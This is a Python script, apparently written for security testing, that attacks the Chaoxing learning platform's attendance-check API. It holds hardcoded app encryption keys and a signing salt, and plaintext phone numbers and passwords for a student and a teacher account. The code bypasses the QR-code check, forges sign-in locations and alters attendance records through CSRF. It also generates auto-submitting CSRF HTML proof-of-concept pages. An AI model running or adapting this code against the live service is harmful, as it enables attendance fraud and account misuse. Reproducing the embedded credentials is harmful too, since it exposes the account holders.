#!/usr/bin/env python3
"""
测试1: 创建进行中的签到活动，测试学生能否直接签到（绕过二维码）
测试2: 位置签到伪造
测试3: CSRF GET方式完整验证
"""
import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

print("=" * 80)
print("创建进行中签到活动 & 测试学生直接签到")
print("=" * 80)

s_s, puid_s = login("18436633997", "3.1415926Cpy")
s_t, puid_t = login("19712720708", "3.1415926Cpy")
print(f"学生puid={puid_s}, 教师puid={puid_t}")

# ======================================================================
# Step 1: 创建进行中的签到活动
# ======================================================================
print("\n[1] 创建进行中的签到活动...")

# 尝试不同的创建参数
create_attempts = [
    # 普通签到
    {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试-普通签到"},
    # 二维码签到
    {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试-二维码签到", "signType": "1"},
    # 带ifTiJiao
    {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试", "ifTiJiao": "1"},
    # 带更多参数
    {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2", "title": "安全测试",
     "ifTiJiao": "1", "duration": "0", "signType": "0"},
]

new_aid = None
for i, data in enumerate(create_attempts):
    r = s_t.post(f"{BASE}/ppt/activeAPI/createActive", data=data, headers=ajax_hdr, timeout=20)
    d = safe_json(r)
    print(f"  尝试{i+1}: {json.dumps(d, ensure_ascii=False)[:200]}")
    if isinstance(d, dict) and d.get("result"):
        aid_candidate = str(d.get("result", ""))
        if aid_candidate and len(aid_candidate) > 5:
            new_aid = aid_candidate
            print(f"  创建成功! aid={new_aid}")
            break

if not new_aid:
    # 尝试不同的API路径
    print("  尝试其他创建路径...")
    alt_paths = [
        "/newsign/createActive",
        "/pptSign/createActive",
        "/pptSign/startSign",
    ]
    for path in alt_paths:
        data = {"courseId": COURSE_ID, "classId": CLASS_ID, "activeType": "2",
                "title": "安全测试", "uid": puid_t}
        r = s_t.post(f"{BASE}{path}", data=data, headers=ajax_hdr, timeout=20)
        d = safe_json(r)
        print(f"  {path}: HTTP {r.status_code}, {json.dumps(d, ensure_ascii=False)[:200]}")
        if isinstance(d, dict) and d.get("result") and len(str(d.get("result", ""))) > 5:
            new_aid = str(d["result"])
            print(f"  创建成功! aid={new_aid}")
            break

# ======================================================================
# Step 2: 如果创建成功，测试学生签到
# ======================================================================
if new_aid:
    print(f"\n[2] 使用进行中的活动 aid={new_aid} 测试学生签到...")

    # 查询当前状态
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    before_status = get_status(d)
    print(f"  签到前状态: status={before_status}")

    # 测试stuSignajax - 直接签到
    sign_data = {"activeId": new_aid, "uid": puid_s, "clientip": "",
                 "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"}
    r = s_s.post(f"{BASE}/pptSign/stuSignajax", data=sign_data, headers=ajax_hdr, timeout=20)
    print(f"  stuSignajax(标准): {r.text[:200]}")

    time.sleep(2)

    # 验证
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    after_status = get_status(d)
    print(f"  签到后状态: status={after_status}")

    if after_status == 1 and before_status is None:
        print("  *** 学生直接签到成功！无需二维码！***")
    elif after_status != before_status:
        print(f"  *** 状态变化: {before_status} -> {after_status} ***")
    else:
        print("  签到未成功，尝试其他方法...")

        # 尝试带位置信息
        sign_data_loc = {"activeId": new_aid, "uid": puid_s, "clientip": "",
                         "latitude": "39.908823", "longitude": "116.397470",
                         "appType": "15", "fid": "0", "address": "北京市天安门广场"}
        r = s_s.post(f"{BASE}/pptSign/stuSignajax", data=sign_data_loc, headers=ajax_hdr, timeout=20)
        print(f"  stuSignajax(带位置): {r.text[:200]}")

        time.sleep(2)
        r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        after_status2 = get_status(d)
        print(f"  签到后状态2: status={after_status2}")

    # 结束活动
    r = s_t.post(f"{BASE}/ppt/activeAPI/endSign",
                 data={"activeId": new_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
                 headers=ajax_hdr, timeout=20)
    print(f"  结束活动: {r.text[:100]}")
else:
    print("\n[2] 无法创建新活动，使用现有活动测试...")

    # 使用现有的已结束活动测试stuSignajax
    # 之前测试结果显示stuSignajax对已结束的二维码签到返回"签到失败，请重新扫描"
    # 对普通签到返回"您已签到过了"
    # 关键问题：对于进行中的签到，stuSignajax是否需要二维码？

    # 让我们检查是否有进行中的活动
    r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            if str(item.get("status", "")) == "1":  # 进行中
                print(f"  找到进行中的活动: id={item.get('id')}, type={item.get('activeType')}, name={item.get('nameOne')}")
                ongoing_aid = str(item.get("id"))
                r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                             data={"activeId": ongoing_aid, "uid": puid_s, "clientip": "",
                                   "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0"},
                             headers=ajax_hdr, timeout=20)
                print(f"  stuSignajax(进行中): {r.text[:200]}")
                break
        else:
            print("  没有进行中的活动")

# ======================================================================
# Step 3: 位置签到伪造测试
# ======================================================================
print("\n" + "=" * 80)
print("[3] 位置签到伪造测试")
print("=" * 80)

# 找到位置签到类型的活动
location_aid = None
r = s_s.get(f"{BASE}/ppt/activeAPI/taskactivelist",
            params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
d = safe_json(r)
if isinstance(d, dict) and "activeList" in d:
    for item in d["activeList"]:
        if "位置" in str(item.get("nameOne", "")):
            location_aid = str(item.get("id"))
            print(f"  位置签到活动: id={location_aid}, name={item.get('nameOne')}")
            break

if location_aid:
    # 查询当前状态
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    loc_status = get_status(d)
    print(f"  当前状态: status={loc_status}")

    if loc_status is None:
        # 未签到，尝试伪造位置签到
        fake_locations = [
            ("39.908823", "116.397470", "北京市天安门广场"),
            ("31.230416", "121.473701", "上海市外滩"),
            ("22.543099", "114.057868", "深圳市市民中心"),
        ]
        for lat, lng, addr in fake_locations:
            r = s_s.post(f"{BASE}/pptSign/stuSignajax",
                         data={"activeId": location_aid, "uid": puid_s, "clientip": "",
                               "latitude": lat, "longitude": lng, "appType": "15", "fid": "0",
                               "address": addr},
                         headers=ajax_hdr, timeout=20)
            print(f"  伪造位置({addr}): {r.text[:200]}")

            time.sleep(2)
            r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": location_aid, "uid": puid_s}, timeout=20)
            d = safe_json(r)
            new_status = get_status(d)
            if new_status == 1:
                print(f"  *** 位置签到伪造成功！***")
                break
            else:
                print(f"  签到未成功, status={new_status}")
    else:
        print(f"  已签到(status={loc_status})，跳过位置伪造测试")
else:
    print("  没有找到位置签到活动")

# ======================================================================
# Step 4: CSRF GET方式完整验证
# ======================================================================
print("\n" + "=" * 80)
print("[4] CSRF GET方式完整验证")
print("=" * 80)

aid = "5000163891319"

# 先把学生状态改为缺勤
r = s_t.post(f"{BASE}/pptSign/updateSignStatusByUidsV2",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "0", "remark": ""},
             headers=ajax_hdr, timeout=20)
print(f"  教师设为缺勤: {r.text[:100]}")

time.sleep(2)

# 验证当前状态
r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
before = get_status(d)
print(f"  当前状态: status={before}")

# 模拟CSRF GET请求（教师session，无自定义Header，无Referer检查）
csrf_url = (f"{BASE}/pptSign/updateSignStatusByUidsV2"
            f"?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}"
            f"&uids={puid_s}&status=1&remark=")
r = s_t.get(csrf_url, timeout=20)
print(f"  CSRF GET请求: {r.text[:200]}")

time.sleep(2)

# 验证
r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": aid, "uid": puid_s}, timeout=20)
d = safe_json(r)
after = get_status(d)
print(f"  CSRF后状态: status={after}")

if after == 1 and before != 1:
    print("  *** CSRF GET方式修改签到状态成功！***")
    print("  *** 这意味着只需教师访问一个URL即可修改签到状态 ***")
    print(f"  *** CSRF URL: {csrf_url} ***")
else:
    print(f"  CSRF未生效: {before} -> {after}")

# ======================================================================
# Step 5: 生成完整的CSRF利用HTML
# ======================================================================
print("\n" + "=" * 80)
print("[5] 生成CSRF利用PoC")
print("=" * 80)

# GET方式 - 最简单，只需img标签
csrf_get_html = f"""<!DOCTYPE html>
<html>
<head><title>图片加载中...</title></head>
<body>
<!-- CSRF PoC: GET方式修改签到状态 -->
<!-- 教师访问此页面时，浏览器会自动发送GET请求 -->
<img src="{BASE}/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={{ACTIVE_ID}}&uids={{STUDENT_UID}}&status=1&remark=" width="0" height="0" alt="" />
<p>页面加载完成</p>
</body>
</html>"""

# POST方式 - 自动提交表单
csrf_post_html = f"""<!DOCTYPE html>
<html>
<head><title>页面加载中...</title></head>
<body>
<!-- CSRF PoC: POST方式修改签到状态 -->
<form id="csrf" method="POST" action="{BASE}/pptSign/updateSignStatusByUidsV2?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={{ACTIVE_ID}}">
    <input type="hidden" name="uids" value="{{STUDENT_UID}}" />
    <input type="hidden" name="status" value="1" />
    <input type="hidden" name="remark" value="" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>"""

with open("/workspace/csrf_get_poc.html", "w", encoding="utf-8") as f:
    f.write(csrf_get_html)
with open("/workspace/csrf_post_poc.html", "w", encoding="utf-8") as f:
    f.write(csrf_post_html)

print("  CSRF PoC已生成:")
print("  - /workspace/csrf_get_poc.html (GET方式，img标签)")
print("  - /workspace/csrf_post_poc.html (POST方式，自动提交表单)")

# ======================================================================
# Step 6: newsign/updateSignStatus 假success深入分析
# ======================================================================
print("\n" + "=" * 80)
print("[6] /newsign/updateSignStatus 假success深入分析")
print("=" * 80)

# 测试: 对不存在的活动ID
fake_aid = "9999999999999"
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": fake_aid},
             data={"uids": puid_s, "status": "1", "remark": "",
                   "activeId": fake_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers=ajax_hdr, timeout=20)
print(f"  不存在的activeId: {r.text[:200]}")

# 测试: 对已结束的活动
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             data={"uids": puid_s, "status": "2", "remark": "",
                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
             headers=ajax_hdr, timeout=20)
print(f"  已结束活动(修改status=2): {r.text[:200]}")

# 测试: 对进行中的活动（如果有）
if new_aid:
    r = s_s.post(f"{BASE}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": new_aid},
                 data={"uids": puid_s, "status": "1", "remark": "",
                       "activeId": new_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers=ajax_hdr, timeout=20)
    print(f"  进行中活动: {r.text[:200]}")

    time.sleep(2)
    r = s_s.get(f"{BASE}/v2/apis/sign/signIn", params={"activeId": new_aid, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    ns_status = get_status(d)
    print(f"  newsign修改后状态: status={ns_status}")

# 测试: 不带任何参数
r = s_s.post(f"{BASE}/newsign/updateSignStatus", headers=ajax_hdr, timeout=20)
print(f"  无参数: HTTP {r.status_code}, {r.text[:200]}")

# 测试: 只带activeId
r = s_s.post(f"{BASE}/newsign/updateSignStatus",
             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
             headers=ajax_hdr, timeout=20)
print(f"  只带activeId: HTTP {r.status_code}, {r.text[:200]}")

print("\n" + "=" * 80)
print("测试完成")
print("=" * 80)
